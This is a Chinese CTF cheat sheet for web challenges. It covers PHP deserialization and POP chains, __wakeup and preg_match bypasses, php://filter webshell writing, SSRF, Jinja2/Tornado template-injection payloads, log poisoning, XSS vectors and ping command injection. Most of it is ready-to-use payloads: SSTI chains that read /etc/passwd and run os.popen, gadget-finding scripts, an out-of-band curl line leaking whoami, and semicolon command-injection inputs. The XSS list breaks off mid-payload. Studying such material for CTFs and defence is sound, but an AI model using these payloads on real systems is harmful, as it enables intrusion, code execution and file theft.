---
sort: 4
---

{% raw  %}

# Web 题的一些思路

## 0. 思路

1. 检查是否存在`robots.txt`文件。
2. 梳理业务流程， 检查是否存在注入类攻击。
3. 通过抓包，查看是否存在可疑点。
4. 爆破后台，查看是否有常见的目录。
5. 文件读取时, 优先查看`/etc/passwd`, `.bashrc`, `.bash_history`
6. 遇到有 composer.json 的题目，首先 composer install 安装一下相关的包依赖

## 1. PHP

### 1.1 反序列化漏洞

#### 1.1.1 序列化和反序列化的概念

- 序列化
  就是将一个对象转换成字符串。字符串包括 **属性名**, **属性值**, **属性类型**和**该对象对应的类名**。
- 反序列化
  相反的将字符串重新恢复成对象
  对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。
  ctf 很多题型也都是考察 PHP 反序列化的相关知识

#### 1.1.2 魔法函数

由于魔法函数的存在, 在反序列化的时候可能造成命令执行.

    方法名	调用条件
    __call	调用不可访问或不存在的方法时被调用
    __callStatic	调用不可访问或不存在的静态方法时被调用
    __clone	进行对象clone时被调用，用来调整对象的克隆行为
    __constuct	构建对象的时被调用；
    __debuginfo	当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本
    __destruct	明确销毁对象或脚本结束时被调用；
    __get	读取不可访问或不存在属性时被调用
    __invoke	当以函数方式调用对象时被调用
    __isset	对不可访问或不存在的属性调用isset()或empty()时被调用
    __set	当给不可访问或不存在属性赋值时被调用
    __set_state	当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。
    __sleep	当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用
    __toString	当一个类被转换成字符串时被调用
    __unset	对不可访问或不存在的属性进行unset时被调用
    __wakeup	当使用unserialize时被调用，可用于做些对象的初始化操作

#### 1.1.3 \_\_wakeup()魔术方法漏洞:

**wakeup()是用在反序列化操作中。unserialize()会检查存在一个**wakeup()方法。如果存在，则先会调用\_\_wakeup()方法。
例如:

```php
<?php
class A{
    function __wakeup(){
    echo 'Hello';
    }
}
$c = new A();
$d=unserialize('O:1:"A":0:{}');
?>
```

最后页面输出了 Hello。在反序列化的时候存在\_\_wakeup()函数，所以最后就会输出 Hello  
**漏洞说明**:

```php
<?php
class Student{
    public $full_name = 'zhangsan';
    public $score = 150;
    public $grades = array();
    function __wakeup() {
        echo "__wakeup is invoked";
    }
}
$s = new Student();
var_dump(serialize($s));
?>
```

最后页面上输出的就是 Student 对象的一个序列化输出，
O:7:"Student":3:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}。其中在 Stuedent 类后面有一个数字 3，整个 3 表示的就是 Student 类存在 3 个属性。
**wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过**wakeup 的执行。当我们将上述的序列化的字符串中的对象属性修改为 5，变为:  
`O:7:"Student":5:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}。`  
反序列化时, 就会跳过`__wakeup()`方法

再例如

```
O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
```

将`"Demo":1`改为`"Demo":2`就可绕过 Demo 类的\_\_wakeup 方法

`+`可以绕过 preg_match 对反序列化字符串的检查

#### 1.1.4 构造 POP 链

- 思路

1. 能控制反序列化的点
2. 反序列化类有魔术方法
3. 魔术方法里有敏感操作（常规思路）
4. 魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop 链

- 例题

```php
<?php
    class person {
        public $name="echo 'I am isee'";

        public function __wakeup(){
            eval ("$this->name;");
        }
    }


    if (isset($_GET['mid'])){
        $mid=$_GET['mid'];
        unserialize("$mid");
    }

    else{
        echo "<h1>hello!!!<h1/>";
    }
```

显然`$name`能被我们控制, 且存在`__weakup`魔术方法, 我们可以将`$name`替换成我们需要的命令, 用如下方式构造 payload:

```php
<?php
class person {
    public $name="echo 'I am isee'";
}

$p = new person();
$p->name = "system('ls');";
$p_ser = serialize($p);
echo urlencode($p_ser);
```

#### 1.1.5 绕过技巧

1. 当`:`后面是`+数字`时，会直接跳过`+`号, 例如:
   `O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}`
   和
   `O:+4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}`
   是等价的.

### 1.2 奇技淫巧

#### 1.2.1 松散类型比较

- 1. 0==任何字符串, 可以绕过弱类型字符串匹配.

---

#### 1.2.2 .htaccess 文件的利用

- 1. 利用.htaccess 文件修改 php.ini
     我们知道 php 的配置都在 php.ini 这个配置文件中，在修改相应的参数后重启一下 web 服务器即可生效。但是有时我们的空间可能是租用的虚拟主机，没有权限修改服务器的配置，这样可以在代码中通过 ini_set()这个函数修改 php 的相关配置。但是这个函数不是万能的，有些参数（例如 post_max_size）修改不了的。PHP 参数的可修改范围有以下几种

```
 常量	         值	            可修改范围
 PHP_INI_USER	 1	 配置选项可在用户的 PHP 脚本或 Windows 注册表中设置
 PHP_INI_PERDIR	 2	 配置选项可在 php.ini, .htaccess 或 httpd.conf 中设置
 PHP_INI_SYSTEM	 4	 配置选项可在 php.ini 或者 httpd.conf 中设置
 PHP_INI_ALL	 7	 配置选项可在各处设置
```

只要常量值不是 PHP_INI_SYSTEM 都可以在.htaccess 中修改，这样只要我们的空间支持.htaccess 就可以了，格式 php_value 名称 值，例如：

```
php_value memory_limit 1024M
php_value max_execution_time 200
php_value post_max_size 64M
php_value auto_append_file footer.php
```

---

#### 1.2.3 preg_match 绕过

- 1. 亦或取反绕过`preg_match`
     例如:

```php
<?php

echo urlencode(~"system");  // %8C%86%8C%8B%9A%92
echo "<br>";
echo urlencode(~"ls");  // %93%8C

$ass = "assert";
$a = ~"system";
$b = ~"ls";

$ass((~$a)(~($b)));
```

---

#### 1.2.4 后缀绕过

- 1. **使用另类文件名**

```
php3
php5
phtml
```

- 2.  **利用系统特性**

```
windows下: filename.php.
linux下: filename.php/.
```

- 3. **解析漏洞**

#### 1.2.5 file_put_contents 的坑

`file_put_contents`碰到不认识的协议时, 例如`fdsja://var//www//html`时, 会将协议内容当做文件读入

#### 1.2.6 php 整数溢出的利用

- 1. **数组溢出**

当 php 数组的键值大于`2^32 - 1`时, 通过该键值获取的值均为 0

---

### 1.3 PHP 伪协议

1. PHP://input: 可以访问请求的原始数据的只读流。用法:

- 配合 file_get_contents("php://input")使用可以将输入赋值;
- 利用文件包含漏洞写入任意代码

2. PHP://filter: 过滤器，可以对原始数据进行编码或解码，或者读取文件。用法：

- `php://filter:/<action>:<name>`

| 名称                      | 描述                                                                   |
| ------------------------- | ---------------------------------------------------------------------- |
| resource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流。                       |
| read=<读链的筛选列表>     | 该参数可选。可以设定一个或多个过滤器名称，以管道符(\|)分隔             |
| write=<写链的筛选列表>    | 该参数可选。可以设定一个或多个过滤器名称，以管道符(\|)分隔             |
| <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |

例如：
`php://filter/write=convert.base64-decode/resource=shell.php`
`php://filter/write=convert.base64-decode/resource=php://input`

3. 利用伪协议可以绕过`<?php exit(); ?>`
   例如有如下 PHP 代码:

```php
$content = '<?php exit(); ?>'.$_GET['code'];
$filename = $_GET['filename'];
file_put_content($filename, $content);
```

就可以使用 base64 解码的伪协议绕过`exit`写入 webshell.
因为 base64 解码时, 会将跳过非 base64 组成的字符, 因此`<?php exit(); ?>`在 base64 时, 只剩下了`phpexit`7 个字符, 因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个“a”一共 8 个字符。这样，"phpexita"被正常解码，而后面我们传入的 webshell 的 base64 内容也被正常解码。结果就是`<?php exit(); ?>`没有了。
令:
`$filename=php://filter/write=convert.base64-decode/resource=filename.php`
`$_GET['code']`为 webshell 的 base64 编码

4. 支持伪协议的函数

```
file_put_contents
file_get_contents
is_file

```

### 1.3 SSRF

在 PHP 中：某些函数的不当使用会导致 SSRF：如

- `file_get_conntents()`: 把文件写入字符串，当 url 是内网文件时，会先把这个文件的内容读出来再写入，导致了文件读取
- `fsockopen()`: 实现获取用户指定 url 的数据 (文件或者 html)，这个函数会使用 socket 跟服务器建立 tcp 连接，传输原始数据
- `curl_exec()`: 通过 file、dict、gopher 三个协议来进行渗透
  - `dict`: 可以进行端口扫描, 例如`http://192.168.1.2/?url=dict://127.0.0.1:8000`

危害：获取 web 应用可达服务器服务的 banner 信息，以及收集内网 web 应用的指纹识别，
根据这些信息再进行进一步的渗透，攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，
对有漏洞的内网 web 应用实施攻击获取 webshell
利用由脆弱性的组件结合 ftp://、file://、dict:// 等协议实施攻击

常见 tcp 协议转 gopher 的攻击:

[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

## 2. 模板注入(SSTI)

### 简介

模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

### 测试方法

- 确定使用的引擎
- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
- 需找攻击面，尝试攻击

### 测试用例

- 简单的数学表达式，{{ 7+7 }} => 14
- 字符串表达式 {{ "ajin" }} => ajin
- Ruby

```
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
```

- Java

```
${7*7}
```

- Twig

```
{{7*7}}
```

- Smarty

```
{php}echo `id`;{/php}
```

- AngularJS

```
$eval('1+1')
```

- Tornado

```
引用模块 {% import module %}
=> {% import os %}{{ os.popen("whoami").read() }}
```

- Flask/Jinja2

```
{{ config.items() }}
{{''.__class__.__mro__[-1].__subclasses__()}}
```

- Django

```
{{ request }}
{% debug %}
{% load module %}
{% include "x.html" %}
{% extends "x.html" %}
```

### Python SSTI 相关属性

1. `__class__`: python 中的新式类（即显示继承 object 对象的类）都有一个属性 `__class__` 用于获取当前实例对应的类，例如 `"".__class__` 就可以获取到字符串实例对应的类

```
>>> print("".__class__)
<class 'str'>
```

2. `__base__`: 获取某个类的父(基)类

```
>>> print("".__class__.__base__)
<class 'object'>
```

3. `__mro__`: python 中类对象的 **mro** 属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order） 寻找的顺序。

```
>>> print("".__class__.__mro__)
(<class 'str'>, <class 'object'>)
```

4. `__subclasses__()`: python 的新式类都保留了它所有的子类的引用，**subclasses**()这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。  
   因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的 **subclasses**() 方法就可以获取想要的类的对象。

> > > print(().**class**.**mro**[1].**subclasses**())
> > > [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'moduledef'>, <class 'module'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class 'zipimport.zipimporter'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'rlcompleter.Completer'>]

### Payload

```python
# object 子类的第40个类为file类, 使用file("filename").read()可以读取文件
().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()
# object 子类的第59个类为warnings.catch_warnings类, 该类的全部变量中有eval函数, 可以执行命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )
```

python3 没有 file 类, 使用 open 打开文件

```python
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
```

Flask 内置了两个函数 url_for 和 get_flashed_messages,还有一些内置的对象

```python
{{url_for.__globals__['__builtins__'].__import__('os').system('ls')}}
{{request.__init__.__globals__['__builtins__'].open('/flag').read()}}
```

**过滤双花括号时:**

```
#用{%%}标记
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
这样会没有回显,考虑带外或者盲注

# 用{% print %}标记,有回显
{%print config%}
```

**过滤了`[`时:**

```
#getitem、pop
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('calc')
{%print+().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(133).__enter__.__globals__.get('po'+'pen')('id').read()%}

{% print ().__class__.__base__.getitem__(0).__subclasses__().getitem__(133).__enter__.__globals__.get('po'+'pen')('id').read() %}
```

**关键字过滤:**

如果没用过滤引号,使用反转,或者各种拼接绕过

```
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__snitliub__'[::-1]]['eval']('__import__("os").popen("ls").read()')}}

{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__buil'+'tins__'[::-1]]['eval']('__import__("os").popen("ls").read()')}}
```

过滤了引号, 利用将需要的变量放在请求中,然后通过[],或者通过`attr`,`__getattribute__`获得

```
// url?a=eval
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.[request.args.a]('__import__("os").popen("ls").read()')

// Cookie: aa=__class__;bb=__mro__;cc=__subclasses__
{{((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1))|attr(request.cookies.get('cc'))()}}
```

如果`request`被 ban,可以考虑通过`{{(config.__str__()[2])+(config.__str__()[3])}}`拼接需要的字符
查出`chr`函数,利用`set`赋值,然后使用

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
```

利用内置过滤器拼接出,'%c',再利用''%语法得到任意字符

```
get %
找到特殊字符<,url编码,得到%
{%set pc = g|lower|list|first|urlencode|first%}


get 'c'

{%set c=dict(c=1).keys()|reverse|first%}

字符串拼接

{%set udl=dict(a=pc,c=c).values()|join %}

可以得到任意字符了

get _
{%set udl2=udl%(95)%}{{udl}}
```

寻找 payload 的脚本

```python
#寻找包含os模块的脚本
#!/usr/bin/env python
# encoding: utf-8
for item in ''.__class__.__mro__[2].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print(num,item)
         num+=1
    except:
        # print '-'
        num+=1
```

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

```python
#!/usr/bin/python3
# coding=utf-8
# python 3.5
from flask import Flask
from jinja2 import Template
# Some of special names
searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
neededFunction = ['eval', 'open', 'exec']
pay = int(input("Payload?[1|0]"))
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    for attr in searchList:
        if hasattr(i, attr):
            if eval('str(i.'+attr+')[1:9]') == 'function':
                for goal in neededFunction:
                    if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                        if pay != 1:
                            print(i.__name__,":", attr, goal)
                        else:
                            print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")
```

## 3. 本地文件包含

### 日志毒化

1. access.log
   当访问某个页面的时候, web 中间件(例如 apache 或 nginx)或生成 access 日志. 利用这一特性, 在访问某一页面时, 将 request 的某个 header 修改为一句话木马, 使用文件包含该日志的之后, 该一句话木马便会执行.

2. error.log
   当访问页面出错时, 访问的信息会被写入 error.log 中. 利用这一特性, 在使用文件包含漏洞注入文件名的时候, 将文件名替换为一句话木马. 则该访问信息会存储到 error.log 里. 这时使用文件包含该日志后, 一句话木马便会执行.

## 4. XSS Payload 收集

```html
<img src="1" onerror="javascript:top['ale'+'rt'](12345);" ; />
<img src="1" onerror="top['ale'+'rt'](12345);" ; />
<img src="x" onerror="javascript:window.onerror=alert;throw 1" />
```

XSS payload 速查表

      十进制值                         URL编码                            介绍
        47                              %2F                             正斜杠
        13                              %0D                             回车
        12                              %0C                             分页符
        10                              %0A                             换行
        9                               %09                             水平制表符

```
<svg></p ><style><a id="</style>< img src=1 onerror=alert(1)>
<svg><p><style><a id="</style>< img src=1 onerror=alert(1)>"></p ></svg>

<svg/οnlοad=alert(1)>

<svg

onload=alert(1)><svg> # newline char

<svg    onload=alert(1)><svg> # tab char

<svg οnlοad=alert(1)>   # new page char (0xc)

< img src=x onerror=alert()>

<svg onload=alert()>

<body onpageshow=alert(1)>

<div style="width:1000px;height:1000px" onmouseover=alert()></div>

<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)

<marquee onstart=alert(1)> (firefox only)

<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)

<input autofocus="" onfocus=alert(1)></input>

<details open ontoggle="alert()">  (chrome & opera only)
```

事件名称 标签 备注
onplay video, audio 适用于 0-click：结合 HTML 的 autoplay 属性以及结合有效的视频/音频
onplaying video, audio 适用于 0-click: 结合 HTML 的 autoplay 属性以及结合有效的视频/音频
oncanplay video, audio 必须链接有效的视频/音频
onloadeddata video, audio 必须链接有效的视频/音频
onloadedmetadata video, audio 必须链接有效的视频/音频
onprogress video, audio 必须链接有效的视频/音频
onloadstart video, audio 潜在的 0-click 向量
oncanplay video, audio 必须链接有效的视频/音频

```
<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<video controls onloadstart="a
```

## 5. ping 命令执行

一般这种题目会给一个输入框, 输入 ip 执行 ping 这个 ip 的命令。类似这种实现：

```php
$ip = $_GET['ip'];
eval("ping ".$ip);
```

常见 payload:

```
127.0.0.1;ls
127.0.0.1&ls
127.0.0.1
```

{% endraw %}
